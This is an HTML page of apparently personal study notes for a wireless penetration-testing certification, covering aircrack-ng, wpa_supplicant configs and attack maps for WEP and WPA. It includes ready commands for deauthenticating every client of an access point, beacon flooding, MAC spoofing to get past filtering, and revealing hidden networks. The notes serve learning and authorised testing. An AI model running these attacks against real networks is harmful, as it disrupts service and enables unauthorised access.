@@ -1,0 +1,1823 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Brandon&#x27;s OSWP Notes</title>
+        <meta name="robots" content="noindex">
+
+
+        <!-- Custom HTML head -->
+        
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="favicon.svg">
+        <link rel="shortcut icon" href="favicon.png">
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        <link rel="stylesheet" href="css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+    </head>
+    <body class="sidebar-visible no-js">
+    <div id="body-container">
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('light')
+            html.classList.add(theme);
+            var body = document.querySelector('body');
+            body.classList.remove('no-js')
+            body.classList.add('js');
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var body = document.querySelector('body');
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            body.classList.remove('sidebar-visible');
+            body.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="Roadmap.html"><strong aria-hidden="true">2.</strong> Chapter 0 - Roadmap</a></li><li class="chapter-item expanded "><a href="chapter_1.html"><strong aria-hidden="true">3.</strong> Chapter 1 - Connect</a></li><li class="chapter-item expanded "><a href="Aircrack.html"><strong aria-hidden="true">4.</strong> Chapter 2 - Aircrack</a></li><li class="chapter-item expanded "><a href="Protocol.html"><strong aria-hidden="true">5.</strong> Chapter 3 - Protocol</a></li><li class="chapter-item expanded "><a href="Cracking.html"><strong aria-hidden="true">6.</strong> Chapter 4 - Cracking</a></li><li class="chapter-item expanded "><a href="WEP.html"><strong aria-hidden="true">7.</strong> Chapter 5 - WEP</a></li><li class="chapter-item expanded "><a href="WPA.html"><strong aria-hidden="true">8.</strong> Chapter 6 - WPA</a></li><li class="chapter-item expanded "><a href="WPAEnterprise.html"><strong aria-hidden="true">9.</strong> Chapter 7 - WPA Enterprise</a></li><li class="chapter-item expanded "><a href="RogueAP.html"><strong aria-hidden="true">10.</strong> Chapter 8 - Rogue AP</a></li><li class="chapter-item expanded "><a href="Wireshark.html"><strong aria-hidden="true">11.</strong> Chapter 9 - Wireshark</a></li><li class="chapter-item expanded "><a href="Links.html"><strong aria-hidden="true">12.</strong> Chapter 10 - Links</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <!-- Track and set sidebar scroll position -->
+        <script>
+            var sidebarScrollbox = document.querySelector('#sidebar .sidebar-scrollbox');
+            sidebarScrollbox.addEventListener('click', function(e) {
+                if (e.target.tagName === 'A') {
+                    sessionStorage.setItem('sidebar-scroll', sidebarScrollbox.scrollTop);
+                }
+            }, { passive: true });
+            var sidebarScrollTop = sessionStorage.getItem('sidebar-scroll');
+            sessionStorage.removeItem('sidebar-scroll');
+            if (sidebarScrollTop) {
+                // preserve sidebar scroll position when navigating via links within sidebar
+                sidebarScrollbox.scrollTop = sidebarScrollTop;
+            } else {
+                // scroll sidebar to current active section when navigating via "next/previous chapter" buttons
+                var activeSection = document.querySelector('#sidebar .active');
+                if (activeSection) {
+                    activeSection.scrollIntoView({ block: 'center' });
+                }
+            }
+        </script>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Brandon&#x27;s OSWP Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="welcome-to-my-oscp-mdbook"><a class="header" href="#welcome-to-my-oscp-mdbook">Welcome to my OSCP mdBook</a></h1>
+<p>Currently, I'm preparing for the OSCP exam. While I utilize Obsidian for note-taking, I've discovered the advantage of having a well-formatted notebook for reference over a conventional note-taking application. This document is dynamic, undergoing multiple updates throughout the day.</p>
+<p>Checkout my LinkedIn and Website:</p>
+<ul>
+<li><a href="https://www.linkedin.com/in/brandon-r-russell">LinkedIn</a></li>
+<li><a href="https://brandonrussell.io/">Website</a></li>
+</ul>
+<p>Here's an awesome mindmap I found here: <a href="https://github.com/koutto/pi-pwnbox-rogueap/wiki">Koutto Github</a></p>
+<p><img src="WiFi-Hacking-MindMap-v1.png" alt="OSWPMindMap" /></p>
+<p>-Brandon</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-0---roadmap"><a class="header" href="#chapter-0---roadmap">Chapter 0 - Roadmap</a></h1>
+<h2 id="exam-roadmap"><a class="header" href="#exam-roadmap">Exam Roadmap</a></h2>
+<pre><code>ssh &lt;username&gt;@&lt;target_ip&gt; -p&lt;port&gt;                        ## connecting to the target system with SSH information provided by @offsec
+iw dev wlan0 scan | grep SSID                              ## wireless networks within the range of the wireless card (wlan0) are detected
+airmon-ng start wlan0                                      ## setting the wireless card (wlan0) to monitor mode
+airodump-ng mon0                                           ## detecting surrounding networks by listening to the network in monitor mode
+iwconfig mon0 channel 3                                    ## change the channel where the wireless network card is located
+iwlist mon0 channel                                        ## view the channel where the wireless network card is located
+airodump-ng -c 3 --bssid &lt;AP_MAC&gt; -w &lt;capture_file&gt; mon0   ## listening to the target AP on the specified channel
+                                                                              
+       
+ 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+</code></pre>
+<h2 id="opening-more-than-one-screen-with-the-screen-tool"><a class="header" href="#opening-more-than-one-screen-with-the-screen-tool">Opening more than one screen with the "screen" tool;</a></h2>
+<pre><code>
+  # screen -S test        ## creating a workspace
+  # scren -l              ## list actively used screens
+  # screen -a -r 13245    ## switch to a specifically selected screen
+  # CTRL + a + n          ## connects to the next session
+  # CTRL + a + p          ## go back to the previous session
+
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+</code></pre>
+<h3 id="attack-map---wep"><a class="header" href="#attack-map---wep">Attack Map - WEP?###</a></h3>
+<pre><code>&gt; WEP;
+
+  AUTH: OPN? or SKA?
+
+  &gt; AUTH: OPN;
+
+    Any client connected to AP? YES? or NO?
+
+    &gt; YES;
+
+      # ARP Request Replay Attack
+      # Interactive Packet Replay Attack
+      # Deauthentication Attack (can be used in both cases (yes or no))
+  
+    &gt; NO;
+
+      # Fake Authentication Attack (can be used in both cases (yes or no))
+      # Fragmentation Attack
+      # Korek ChopChop Attack
+
+
+  &gt; AUTH: SKA (Bypassing WEP Shared Key Authentication);
+
+    ## There is a client connected to the AP. You can follow the steps below to attack;
+
+     # Deauthentication Attack
+     # Fake Shared Key Authentication Attack
+     # ARP Request Replay Attack
+     # Deauthentication Attack
+     # Aircrack-ng
+
+
+</code></pre>
+<h3 id="attack-map---wpawpa2"><a class="header" href="#attack-map---wpawpa2">Attack Map - WPA/WPA2?###</a></h3>
+<pre><code>&gt; WPA/WPA2
+
+  ## Attack;
+
+    # Deauthentication Attack
+  
+  ## Cracking the network key;
+
+    # with Aircrack-ng
+    # with JTR and Aircrack-ng
+    # with coWPAtty
+    # with Pyrit
+
+
+
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-1---connect"><a class="header" href="#chapter-1---connect">Chapter 1 - Connect</a></h1>
+<h2 id="connecting-to-an-access-point"><a class="header" href="#connecting-to-an-access-point">Connecting to an Access Point</a></h2>
+<h3 id="change-between-monitor-and-manage-mode"><a class="header" href="#change-between-monitor-and-manage-mode">Change between monitor and manage mode</a></h3>
+<h4 id="monitor-mode"><a class="header" href="#monitor-mode">Monitor mode</a></h4>
+<h5 id="airmon-ng"><a class="header" href="#airmon-ng">airmon-ng</a></h5>
+<p><code>airmon-ng start wlan0</code></p>
+<h5 id="manually"><a class="header" href="#manually">Manually</a></h5>
+<pre><code class="language-bash"># Use the following command to set interface in monitor mode.
+iw dev &lt;interface&gt; set monitor none
+
+# If this gives you device busy error, then do the following:
+ifconfig &lt;interface&gt; down
+iw dev &lt;interface&gt; set monitor none
+ifconfig &lt;interface&gt; up
+</code></pre>
+<h4 id="managed-mode"><a class="header" href="#managed-mode">Managed mode</a></h4>
+<p><font color=red>Needed for connecting to networks!!!</font></p>
+<h5 id="airmon-ng-1"><a class="header" href="#airmon-ng-1">airmon-ng</a></h5>
+<p><code>sudo airmon-ng stop wlan0mon</code></p>
+<h5 id="manually-1"><a class="header" href="#manually-1">Manually</a></h5>
+<pre><code class="language-bash">ifconfig mon0 down
+ifconfig mon0 mode managed
+ifconfig mon0 up
+</code></pre>
+<p>We can also disconnect and reconnect the adapter. With <code>iwconfig</code> we can see the mode of the interface.</p>
+<p>To connect to a network we need to reestart NetworkManager, if we killed it previously with <code>airmon-ng check kill</code>
+<code>sudo service NetworkManager start</code></p>
+<p>If the network uses mac filtering we cannot connect. It can be blacklist or whitelist. If it's blacklist we can use any non blacklisted MAC. If it's whitelisted we need to use the MAC of a connected client.
+A symptom of MAC filtering is that the network is OPEN or we have a password and still can't connect</p>
+<p><font color=red>sometimes changed macs don't stay when trying to connect to the network </font></p>
+<h3 id="wpa_supplicant---client-to-connect-to-wifi-networks"><a class="header" href="#wpa_supplicant---client-to-connect-to-wifi-networks">wpa_supplicant -&gt; Client to connect to wifi networks</a></h3>
+<p><font color=red>IMPORTANT, indent what's insde braces or it will fail (parsing error). If tabs fail, add a couple of whitespaces instead</font></p>
+<p><font color=red>IMPORTANT, if wpa_supplicant is connected via an interface to a network it cannot connect to another, search ps aux for wpa_supplicant processes and kill them before connecting to another network or with a different configuration</font></p>
+<p>several interfaces of wpa_supplicant can be run in parallel for different interfaces with different configurations</p>
+<ul>
+<li>scan_ssid -&gt; send probe requests</li>
+</ul>
+<h4 id="config-file-for-open-network"><a class="header" href="#config-file-for-open-network">Config file for open network</a></h4>
+<pre><code>network={
+  ssid="&lt;ESSID&gt;"
+  scan_ssid=1
+}
+</code></pre>
+<p>alternative:</p>
+<pre><code>network={
+  ssid="&lt;ESSID&gt;"
+  scan_ssid=1
+  mode=0
+  auth_alg=OPEN
+  key_mgmt=NONE
+}
+</code></pre>
+<h4 id="config-file-for-wep-network"><a class="header" href="#config-file-for-wep-network">Config file for WEP network</a></h4>
+<p><font color=red>If we have a hex key, dont use quotation marks " and don't use : to separate bytes (the next two examples are equivalent, one with ASCII key and the other with hex key)</font></p>
+<pre><code>network={
+  ssid="&lt;ESSID&gt;"
+  key_mgmt=NONE
+  wep_key0="34567"
+  wep_tx_keyidx=0
+}
+</code></pre>
+<pre><code>network={
+  ssid="&lt;ESSID&gt;"
+  key_mgmt=NONE
+  wep_key0=0304050607
+  wep_tx_keyidx=0
+}
+</code></pre>
+<p>alternative</p>
+<pre><code>network={
+  ssid="&lt;ESSID&gt;"
+  scan_ssid=1
+  mode=0
+  auth_alg=OPEN
+  key_mgmt=NONE
+  wep_key0=0304050607
+}
+</code></pre>
+<h4 id="config-file-for-wpa-psk-network"><a class="header" href="#config-file-for-wpa-psk-network">Config file for WPA-PSK network</a></h4>
+<p>Valid for WPA-PSK and WPA2-PSK</p>
+<pre><code>network={
+  ssid="&lt;ESSID&gt;"
+  scan_ssid=1
+  psk="&lt;passphrase&gt;"
+  key_mgmt=WPA-PSK
+}
+</code></pre>
+<p>alternative</p>
+<pre><code>network={
+  ssid="&lt;ESSID&gt;"
+  mode=0
+  scan_ssid=1
+  auth_alg=OPEN
+  key_mgmt=WPA-PSK
+  proto=WPA
+  pairwise=TKIP
+  group=TKIP
+  psk="&lt;passphrase&gt;"
+  
+}
+</code></pre>
+<h4 id="specific-config-file-for-wpa2-psk"><a class="header" href="#specific-config-file-for-wpa2-psk">Specific config file for WPA2-PSK</a></h4>
+<p>but WPA2-PSK (only) can be specified like this also:</p>
+<p>wpa_supplicant will automatically choose between TKIP and CCMP based on availability, but it is possible to force one or the other by adding <em>pairwise=CCMP</em> or <em>pairwise=TKIP</em> to the configuration if necessary.</p>
+<pre><code>network={
+  ssid="&lt;ESSID&gt;"
+  key_mgmt=WPA_PSK
+  psk="&lt;passphrase&gt;"
+  proto=RSN
+  pairwise=CCMP
+  group=CCMP
+}
+
+# less specific, can work better
+network={
+  ssid="&lt;ESSID&gt;"
+  key_mgmt=WPA_PSK
+  psk="&lt;passphrase&gt;"
+  proto=RSN
+}
+
+# or maybe this is necessary, due to retrocompatibility with old devices
+network={
+  ssid="&lt;ESSID&gt;"
+  key_mgmt=WPA_PSK
+  psk="&lt;passphrase&gt;"
+  proto=WPA
+  pairwise=CCMP
+  group=CCMP
+}
+</code></pre>
+<ul>
+<li>RSN -&gt; Robust Secure Network (this sets pairwise and group to CCMP, although it can be specified explicitely so that we are not downgraded in any case). Maybe specifying  pairwise and/or group fails, don't specify them first</li>
+</ul>
+<p>alternative:</p>
+<pre><code>network={
+  ssid="&lt;ESSID&gt;"
+  scan_ssid=1
+  mode=0
+  auth_alg=OPEN
+  key_mgmt=WPA_PSK
+  psk="&lt;passphrase&gt;"
+  proto=RSN
+  pairwise=CCMP
+  group=CCMP
+}
+</code></pre>
+<h4 id="wpa-enterprise"><a class="header" href="#wpa-enterprise">WPA-Enterprise</a></h4>
+<h5 id="peap-mschapv2-authentication"><a class="header" href="#peap-mschapv2-authentication">PEAP-MSCHAPv2 authentication</a></h5>
+<pre><code>network={
+  ssid="&lt;ESSID&gt;"
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  eap=PEAP
+  identity="bob"
+  password="hello"
+  phase1="peaplabel=0"
+  phase2="auth=MSCHAPV2"
+}
+</code></pre>
+<h5 id="peap-gtc-wpa-supplicant-configuration"><a class="header" href="#peap-gtc-wpa-supplicant-configuration">PEAP-GTC WPA Supplicant Configuration</a></h5>
+<pre><code>  network={
+  ssid="&lt;ESSID&gt;"
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  eap=PEAP
+  identity="bob"
+  password="hello"
+  phase1="peaplabel=0"
+  phase2="auth=GTC"
+}
+</code></pre>
+<h5 id="ttls-pap-wpa-supplicant-configuration"><a class="header" href="#ttls-pap-wpa-supplicant-configuration">TTLS-PAP WPA Supplicant Configuration</a></h5>
+<pre><code>network={
+  ssid="&lt;ESSID&gt;"
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  eap=TTLS
+  identity="bob"
+  anonymous_identity="anon"
+  password="hello"
+  phase2="auth=PAP"
+}
+</code></pre>
+<h5 id="ttls-chap-wpa-supplicant-configuration"><a class="header" href="#ttls-chap-wpa-supplicant-configuration">TTLS-CHAP WPA Supplicant Configuration</a></h5>
+<pre><code>network={
+  ssid="&lt;ESSID&gt;"
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  eap=TTLS
+  identity="bob"
+  anonymous_identity="anon"
+  password="hello"
+  phase2="auth=CHAP"
+}
+</code></pre>
+<h5 id="ttls-mschapv2-wpa-supplicant-configuration"><a class="header" href="#ttls-mschapv2-wpa-supplicant-configuration">TTLS-MSCHAPv2 WPA Supplicant Configuration</a></h5>
+<pre><code>network={
+  ssid="&lt;ESSID&gt;"
+  scan_ssid=1
+  key_mgmt=WPA-EAP
+  eap=TTLS
+  identity="bob"
+  anonymous_identity="anon"
+  password="hello"
+  phase2="auth=MSCHAPV2"
+}
+</code></pre>
+<p>Tool to generate configuration files: <code>wpa_passphrase</code>. Mandatory parameter: ESSID. Optional parameter: passphrase</p>
+<h4 id="connect-to-a-network-with-wpa_supplicant-and-config-file"><a class="header" href="#connect-to-a-network-with-wpa_supplicant-and-config-file">Connect to a network with wpa_supplicant and config file</a></h4>
+<ul>
+<li>-i -&gt; interface used to connect</li>
+<li>-c -&gt; config file</li>
+<li>-B -&gt; run wpa_supplicant in the background</li>
+</ul>
+<pre><code class="language-bash">sudo wpa_supplicant -i wlan0 -c wifi-client.conf
+
+# sometimes the driver that wpa_supplican uses is specified (different from the driver used for the wifi interface)
+sudo wpa_supplicant -Dnl80211 -i wlan0 -c wifi-client.conf
+
+# request an ip by dhcp, once we are connected to an AP
+dhclient -v wlan0
+</code></pre>
+<h3 id="manual-connection"><a class="header" href="#manual-connection">Manual connection</a></h3>
+<pre><code>sudo /sbin/ifconfig wlan0 up
+sudo /sbin/iwlist wlan0 scan
+sudo /sbin/iwconfig wlan0 essid "NetworkName"
+sudo /sbin/iwconfig wlan0 key network_key
+sudo /sbin/iwconfig wlan0 enc on
+</code></pre>
+<p>To get an IP after connecting to the AP:  <code>dhclient -v wlan0</code></p>
+<p>alternative method:</p>
+<pre><code>sudo iwconfig wlan0 essid &lt;SSID&gt; key s:&lt;KEY&gt;
+sudo dhclient -v wlan0
+</code></pre>
+<h3 id="change-mac-address"><a class="header" href="#change-mac-address">Change MAC address</a></h3>
+<h4 id="manually-2"><a class="header" href="#manually-2">Manually:</a></h4>
+<pre><code class="language-bash">ifconfig wlan0 down
+ifconfig wlan0 hw ether &lt;new MAC&gt;
+ifconfig wlan0 up
+</code></pre>
+<h4 id="mac-changer"><a class="header" href="#mac-changer">Mac-changer:</a></h4>
+<pre><code class="language-bash"># for specified mac
+sudo macchanger -m &lt;valid MAC&gt; wlan0
+
+# for random mac
+sudo macchanger -r wlan0
+</code></pre>
+<h3 id="change-wifi-band"><a class="header" href="#change-wifi-band">Change Wifi band</a></h3>
+<p>for 5 GHz
+<code>airodump-ng --band a wlan0mon</code>
+For both 5 and 2.4 GHz:
+<code>airodump-ng --band abg wlan0mon</code></p>
+<h4 id="wifi-bands"><a class="header" href="#wifi-bands">Wifi bands</a></h4>
+<ul>
+<li>Decide which ranges of freqs can be used</li>
+<li>Determine the channels that can be used</li>
+<li>Clients must support the band used by the AP to connect to it or sniff traffic
+Most common bands:</li>
+<li>a, only 5 GHz -&gt; seems like scanning with airodump on band a can pick up 2.4 GHz APs too</li>
+<li>b, g, only 2.4 GHz</li>
+<li>n, both 5 and 2.4 GHz</li>
+<li>ac, freqs lower than 6 GHz</li>
+</ul>
+<p>Channel bonding: sometimes several channels are combined into one, used to avoid interferences between channels. 802.11 n - compatible networks means that they support channel bonding.</p>
+<p>In 5 GHz there is no overlapping in frequency between adjacent channels, that increases throughput. In 2.4 GHz there is.</p>
+<p>When a client sends the others cannot. For that is good to have low power APs, to avoid many clients connecting to the same AP and one of them takes over.</p>
+<h3 id="other-commands"><a class="header" href="#other-commands">Other commands</a></h3>
+<pre><code class="language-bash"># devices connected by usb
+sudo lsusb -vv
+
+# physical properties of wifi interfaces (support of a card for monitor mode can be found)
+iw dev
+iw phy
+iw list
+
+# view regional settings. If some channel says PASSIVE-SCAN, it is listening but not sending packets
+iw reg get
+
+# change regulatory domain settings
+iw reg set &lt;country code&gt;
+
+# if iw phy says no IR (IR=initial radiation) that channel is not used in the configured country. We can also check if a channel can be used by checking if packets arrive when we do:
+iw dev wlan0 set channel 13
+aireplay-ng --test wlan0
+
+# change channel width (for channel bonding, although management frames have always a standard width of 20 MHz)
+iw dev wlan0 set channel 6 HT40+
+iw dev wlan0 set channel 36 80MHz
+
+# Scan networks without airodump
+iw dev wlan0 scan
+iw dev wlan0 scan |grep "SSID:"
+
+# Connect to an open SSID
+iwconfig wlan0 essid &lt;essid&gt;
+
+
+</code></pre>
+<h3 id="common-mistakes"><a class="header" href="#common-mistakes">Common mistakes:</a></h3>
+<ul>
+<li>interface
+<ul>
+<li>make sure it is up (ifconfig wlan0 up)</li>
+<li>make sure it is the correct mode (iw dev)</li>
+</ul>
+</li>
+<li>sniffing
+<ul>
+<li>sniff in all frequencies: (a, b/g)</li>
+<li>use proper channel width, if there is channel bonding</li>
+</ul>
+</li>
+</ul>
+<h4 id="hidden-networks"><a class="header" href="#hidden-networks">Hidden networks</a></h4>
+<p>Hidden networks don't advertise their name (ESSID) but they advertise their presence (BSSID). This is enough for us to not be able to connect or try to crack their pass, or try to launch attacks against it.</p>
+<p>Airodump only shows the name length, but not its value</p>
+<p>In windows we see "hidden network" and it asks for the name when we try to connect</p>
+<p>If a network has hidden ESSID the first step is to ALWAYS try to find it. If there are clients connected we can deauth one of them and we will capture the name when he reconnects.
+If there are no connected clients try a dictionary attack, trying to connect to a network using different names from a dictionary</p>
+<p>Non probing clients are clients which are there, but don't probe networks, therefore we cannot detect their presence. We can create fake APs to see if he connects to any of them.</p>
+<h3 id="others"><a class="header" href="#others">others</a></h3>
+<p>Several APs with different BSSID can share the same ESSID (this is, a single network with several access points)</p>
+<p>The radiotap header that wireshark shows is added by wireshark, that information is not in packets sent through the air</p>
+<p>Types of frames (for attacks, data frames are the important ones)</p>
+<ul>
+<li>Management (advertisement, discovery, connection/disconnection)</li>
+<li>Control (to facilitate delivery of Management and Data frames)</li>
+<li>Data</li>
+</ul>
+<p>WDS -&gt; wireless distribution system: provide internet access from one wifi router to another via wifi (not by cable), so that the second one can cover a zone where the signal of the first doesn't reach</p>
+<p>Beacon flood attack: fill the air with fake beacons so that clients see a lot of APs and the ones they want to see may fall out of the list <code>mdk4 wlan0 b</code></p>
+<ul>
+<li>
+<p>Some wireless drivers ignore directed deauthentication and only respond to broadcast deauthentication. We can run the same aireplay-ng deauthentication command without the -c parameter.</p>
+</li>
+<li>
+<p>If 802.11w is in use, unencrypted deauthentication frames are ignored. The only course of action is to wait for a client to connect.</p>
+</li>
+<li>
+<p>The device simply didn't reconnect or was already out of range of the AP.</p>
+</li>
+</ul>
+<p>wigle.net -&gt; geographical location of BSSIDs</p>
+<p>Some phones randomize their MAC until the moment they connect to a network, when they switch to the good one. If we setup a honeypot we can get their real MAC if they connect to us</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="chapter-2---aircrack"><a class="header" href="#chapter-2---aircrack">Chapter 2 - Aircrack</a></h1>
+<h2 id="quick-notes"><a class="header" href="#quick-notes">Quick Notes</a></h2>
+<pre><code># Notes
+
+&gt; wlan0   ## network interface where the wireless network card
+&gt; mon0    ## network interface where the wireless network card is in monitor mode
+
+
+
+# airmon-ng check                   ## control monitor processes
+# airmon-ng check kill              ## kill monitor processes
+# airmon-ng start wlan0             ## open the monitor mode 
+# iwconfig mon0 channel 3           ## change the channel where the wireless network card is located
+# iwlist mon0 channel               ## view the channel where the wireless network card is located
+# airmon-ng stop mon0               ## close the monitor mode
+# iw dev wlan0 scan | grep SSID     ## wireless networks within the range of the wireless card (wlan0) are detected
+
+
+
+# airodump-ng mon0                                             ## a basic listening session
+# airodump-ng -c 3 --bssid &lt;AP_MAC&gt; -w cap1 mon0               ## listening to a specific AP's network
+# airodump-ng -c 3 --bssid &lt;AP_MAC&gt; -w cap1 --ivs mon0         ## reducing disk network used by file capture while listening to the network
+
+
+
+# aireplay-ng &lt;options&gt; &lt;interface name&gt;      ##general usage
+
+
+Attack            Attack Name
+------            -----------
+# 0               ## Deauthentication
+# 1               ## Fake Authentication 
+# 2               ## Interactive Packet Replay
+# 3               ## ARP Request Replay Attack 
+# 4               ## KoreK ChopChop Attack 
+# 5               ## Fragmentation Attack 
+# 6               ## Café-Latte Attack 
+# 7               ## Client-Oriented Fragmentation Attack 
+# 9               ## Injection Test 
+
+
+
+# aireplay-ng -9 mon0                             ## basic injection test
+# aireplay-ng -9 -e &lt;ESSID&gt; -a &lt;AP_MAC&gt; mon0      ## injection test for hidden or specific SSID
+# aireplay-ng -9 -i &lt;input interface&gt; mon0        ## card-to-card (attack) injection test
+</code></pre>
+<h4 id="airmon-ng-2"><a class="header" href="#airmon-ng-2">airmon-ng</a></h4>
+<pre><code class="language-bash"># List interfaces
+sudo airmon-ng  
+
+# List programs that can interfere with aircrack-ng suite
+sudo airmon-ng check 
+
+# Kill processes that can interfere with aircrack-ng suite
+sudo airmon-ng check kill
+
+# Create an interface (wlan0mon) in monitor mode from an existing one (wlan0)
+sudo airmon-ng start wlan0
+
+# Stop monitor mode
+sudo airmon-ng stop wlan0mon
+
+# Start monitor mode only on channel 2 (only do this when the tool that will be used next doesn't change channels itself)
+sudo airmon-ng start wlan0 2
+
+# manually set channel
+iw dev wlan0 set channel 13
+
+# Check that we changed the channel correctly
+sudo iw dev wlan0mon info
+
+# verbose and debug mode
+sudo airmon-ng --verbose
+sudo airmon-ng --debug
+
+</code></pre>
+<p>Even if we don't see connected clients, send deauth packets against the different networks, with airodump listening in the specific channel (so that we don't miss reauth attempts if we are scanning other channels at that moment)</p>
+<h4 id="airodump-ng"><a class="header" href="#airodump-ng">airodump-ng</a></h4>
+<pre><code class="language-bash"># Specify the channel where airodump listens
+airodump-ng --channel 11 --bssid &lt;bssid&gt;
+
+# listen to a single bssid and write output to a file (it creates several files with different formats)
+airodump-ng --channel 11 --bssid &lt;bssid&gt; --write &lt;file name&gt;
+
+# scan both 2.4 and 5 GHz simultaneously
+airodump-ng wlan0 --band abg
+
+# load capture file in airodump
+airodump-ng -r &lt;file.cap&gt;
+
+# show WPS status for WPA networks
+airodump-ng wlan0 --wps
+</code></pre>
+<h4 id="aireplay-ng"><a class="header" href="#aireplay-ng">aireplay-ng</a></h4>
+<pre><code class="language-bash"># deauth a client (1000000 is a large number of packets, to keep the deauth attack working for a while):
+sudo aireplay-ng --deauth 4 -a &lt;bssid&gt; -c &lt;client_MAC&gt; wlan0mon
+
+# To background the command and don't see output
+sudo aireplay-ng --deauth 4 -a &lt;bssid&gt; -c &lt;client_MAC&gt; wlan0mon &amp;&gt; /dev/null &amp;
+
+# with "jobs" we can see the jobs backgrounded with &amp;. each has an ID
+jobs
+
+# kill all backgrounded aireplay processes.
+killall aireplay-ng 
+
+# kill only the first process in the "jobs" list:
+kill %1
+
+# To deauth every client connected to a BSSID don't specify a client &lt;MAC&gt;
+aireplay-ng --deauth 4 -a &lt;bssid&gt; wlan0mon &amp;&gt; /dev/null &amp;
+
+# check if we can inject in visible APs
+sudo aireplay-ng -9 wlan0mon 
+
